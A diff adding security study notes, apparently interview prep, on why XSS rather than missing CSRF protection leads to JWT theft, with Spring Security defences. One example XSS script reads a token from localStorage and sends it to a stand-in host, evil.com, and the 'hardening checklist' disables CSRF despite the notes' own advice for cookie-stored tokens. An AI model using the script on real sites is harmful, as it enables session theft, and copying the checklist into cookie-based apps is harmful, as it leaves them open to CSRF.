@@ -1,0 +1,526 @@
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                          🚨 JWT TOKEN THEFT : XSS vs CSRF - COMPLETE SECURITY NOTES 🚨                                           ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+
+🎯 SHORT ANSWER
+
+JWT Token Theft is primarily caused by:
+
+✅ XSS (Cross Site Scripting)
+
+NOT
+
+❌ Missing CSRF Protection
+
+This is one of the most misunderstood topics in security.
+
+====================================================================================================
+🟦 WHY JWT TOKENS GET STOLEN
+====================================================================================================
+
+Suppose Application Stores JWT:
+
+localStorage
+
+localStorage.setItem(
+   "token",
+   jwtToken
+);
+
+----------------------------------------------------------------------------------------------------
+
+Attacker achieves XSS
+
+<script>
+
+const token =
+     localStorage.getItem("token");
+
+fetch(
+   "https://evil.com/steal",
+   {
+      method:"POST",
+      body:token
+   }
+);
+
+</script>
+
+----------------------------------------------------------------------------------------------------
+
+Result
+
+Attacker gets:
+
+✅ JWT Token
+
+Then from his laptop:
+
+Authorization:
+Bearer stolenJWT
+
+And he is now effectively:
+
+✅ Logged in as victim
+
+====================================================================================================
+🟥 XSS IS THE BIGGEST JWT THREAT
+====================================================================================================
+
+Imagine:
+
+bank.com
+
+contains:
+
+<script>
+  malicious code
+</script>
+
+----------------------------------------------------------------------------------------------------
+
+Since script runs INSIDE:
+
+bank.com
+
+Browser allows:
+
+✅ localStorage access
+✅ sessionStorage access
+✅ DOM access
+✅ CSRF token access
+✅ JWT access
+
+----------------------------------------------------------------------------------------------------
+
+Attacker can steal:
+
+JWT
+Refresh Token
+CSRF Token
+User Data
+
+Everything.
+
+====================================================================================================
+🟩 WHY CSRF DOES NOT NORMALLY STEAL JWT
+====================================================================================================
+
+JWT Architecture
+
+Authorization:
+Bearer eyJhbGc...
+
+----------------------------------------------------------------------------------------------------
+
+Important
+
+Browser does NOT automatically send:
+
+Authorization Header
+
+for random websites.
+
+Frontend code must explicitly add:
+
+Authorization:
+Bearer JWT
+
+----------------------------------------------------------------------------------------------------
+
+Attack Site
+
+evil.com
+
+cannot do:
+
+Authorization:
+Bearer victimJWT
+
+because attacker does not know JWT value.
+
+----------------------------------------------------------------------------------------------------
+
+Therefore:
+
+Standard JWT Authentication
+stored in Authorization Header
+
+is generally:
+
+✅ Not vulnerable to traditional CSRF
+
+====================================================================================================
+🟨 WHEN JWT CAN BECOME CSRF VULNERABLE
+====================================================================================================
+
+Suppose JWT stored as Cookie
+
+Set-Cookie:
+
+JWT_TOKEN=abc123
+
+----------------------------------------------------------------------------------------------------
+
+Browser automatically sends
+
+Cookie:
+JWT_TOKEN=abc123
+
+----------------------------------------------------------------------------------------------------
+
+Now architecture starts behaving like:
+
+JSESSIONID Authentication
+
+because browser sends token automatically.
+
+----------------------------------------------------------------------------------------------------
+
+Result
+
+Traditional CSRF becomes possible.
+
+In this design:
+
+✅ CSRF Protection Needed
+
+====================================================================================================
+🟪 RULE OF THUMB
+====================================================================================================
+
+JWT stored in:
+
+Authorization Header
+
+        ↓
+
+Primary Threat
+
+✅ XSS
+
+❌ Traditional CSRF
+
+----------------------------------------------------------------------------------------------------
+
+JWT stored in:
+
+Cookie
+
+        ↓
+
+Primary Threats
+
+✅ XSS
+✅ CSRF
+
+====================================================================================================
+🟫 HOW TO PREVENT JWT THEFT
+====================================================================================================
+
+LAYER 1
+
+Prevent XSS
+
+because XSS is the biggest risk.
+
+----------------------------------------------------------------------------------------------------
+
+1. INPUT VALIDATION
+
+Bad Input
+
+<script>alert('hacked')</script>
+
+----------------------------------------------------------------------------------------------------
+
+Use
+
+@Pattern
+@NotBlank
+@Size
+
+Example
+
+@Pattern(
+ regexp="^[a-zA-Z ]+$"
+)
+
+private String customerName;
+
+====================================================================================================
+⬜ CONTENT SECURITY POLICY (CSP)
+====================================================================================================
+
+Spring Security
+
+.headers(headers ->
+     headers.contentSecurityPolicy(
+          csp ->
+             csp.policyDirectives(
+               "default-src 'self'; script-src 'self'"
+             )
+     )
+)
+
+----------------------------------------------------------------------------------------------------
+
+Effect
+
+Browser executes:
+
+✅ trusted scripts
+
+Rejects:
+
+❌ inline attacker scripts
+❌ external malicious scripts
+
+----------------------------------------------------------------------------------------------------
+
+One of the strongest XSS protections.
+
+====================================================================================================
+🟦 AVOID localStorage FOR HIGH SECURITY APPS
+====================================================================================================
+
+Many tutorials teach:
+
+localStorage.setItem(
+     "token",
+     jwt
+);
+
+This works.
+
+But:
+
+XSS can read localStorage.
+
+----------------------------------------------------------------------------------------------------
+
+Attacker Script
+
+const token =
+      localStorage.getItem("token");
+
+✅ Token Stolen
+
+====================================================================================================
+🟩 BETTER APPROACH : HTTPONLY COOKIE
+====================================================================================================
+
+Response
+
+Set-Cookie:
+
+JWT_TOKEN=abc123
+
+HttpOnly
+Secure
+SameSite=Strict
+
+----------------------------------------------------------------------------------------------------
+
+Now:
+
+document.cookie
+
+cannot read token.
+
+----------------------------------------------------------------------------------------------------
+
+Attacker Script
+
+document.cookie
+
+Result
+
+❌ JWT Not Visible
+
+====================================================================================================
+🟨 BUT WAIT...
+====================================================================================================
+
+Using HttpOnly Cookie introduces:
+
+⚠ CSRF Risk
+
+because browser automatically sends cookie.
+
+----------------------------------------------------------------------------------------------------
+
+Solution:
+
+JWT in HttpOnly Cookie
+        +
+CSRF Token
+        +
+SameSite Cookies
+
+====================================================================================================
+🟥 SAME SITE COOKIES
+====================================================================================================
+
+Set-Cookie:
+
+JWT_TOKEN=abc123
+
+SameSite=Strict
+
+----------------------------------------------------------------------------------------------------
+
+Effect
+
+evil.com
+      ↓
+Request bank.com
+
+Cookie Sent?
+
+❌ No
+
+----------------------------------------------------------------------------------------------------
+
+Huge CSRF Protection Layer.
+
+====================================================================================================
+🟪 SHORT-LIVED ACCESS TOKENS
+====================================================================================================
+
+Bad
+
+Access Token
+
+30 Days
+
+If stolen:
+
+Attacker gets 30 days access.
+
+----------------------------------------------------------------------------------------------------
+
+Better
+
+Access Token
+
+15 Minutes
+
+Refresh Token
+
+7 Days
+
+----------------------------------------------------------------------------------------------------
+
+Even if Access Token stolen:
+
+Damage limited.
+
+====================================================================================================
+🟫 REFRESH TOKEN SECURITY
+====================================================================================================
+
+Best Practice
+
+Access Token
+
+15 Minutes
+
+Stored In Memory
+
+----------------------------------------------------------------------------------------------------
+
+Refresh Token
+
+Stored In
+
+HttpOnly Cookie
+
+----------------------------------------------------------------------------------------------------
+
+Flow
+
+Access Token Expires
+      ↓
+Refresh Token Used
+      ↓
+New Access Token Issued
+
+Most secure modern architecture.
+
+====================================================================================================
+⬜ SPRING SECURITY HARDENING CHECKLIST
+====================================================================================================
+
+@Bean
+public SecurityFilterChain security(
+        HttpSecurity http)
+        throws Exception {
+
+    return http
+
+            .headers(headers ->
+                    headers.contentSecurityPolicy(
+                        csp ->
+                           csp.policyDirectives(
+                             "default-src 'self'; script-src 'self'"
+                           )
+                    )
+            )
+
+            .sessionManagement(session ->
+                    session.sessionCreationPolicy(
+                            SessionCreationPolicy.STATELESS
+                    )
+            )
+
+            .csrf(csrf ->
+                    csrf.disable()
+            )
+
+            .build();
+}
+
+----------------------------------------------------------------------------------------------------
+
+Additional Protections
+
+✅ CSP
+✅ Input Validation
+✅ Output Escaping
+✅ HttpOnly Cookies
+✅ Secure Cookies
+✅ SameSite Cookies
+✅ Short JWT Lifetime
+✅ Refresh Token Rotation
+
+====================================================================================================
+🎯 INTERVIEW MASTER ANSWER
+====================================================================================================
+
+JWT token theft is primarily caused by XSS attacks, not by the absence of CSRF protection. If an attacker executes JavaScript inside the trusted application's origin, the script can read JWTs stored in localStorage, sessionStorage, or accessible cookies and send them to an attacker-controlled server.
+
+Traditional CSRF attacks do not normally steal JWTs because JWT-based systems usually transmit tokens using the Authorization header, which browsers do not automatically attach to cross-site requests.
+
+To prevent JWT theft:
+
+✅ Prevent XSS using input validation, output encoding, sanitization and Content Security Policy.
+✅ Prefer HttpOnly cookies for sensitive tokens.
+✅ Use Secure and SameSite cookie attributes.
+✅ Use short-lived Access Tokens.
+✅ Use Refresh Tokens with rotation.
+✅ Avoid storing long-lived JWTs in localStorage for high-security applications.
+
+MEMORY TRICK:
+
+Session Authentication
+      ↓
+Main Threat = CSRF
+
+JWT Authentication
+      ↓
+Main Threat = XSS
+
+XSS can steal tokens.
+CSRF generally cannot steal tokens.
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════╝
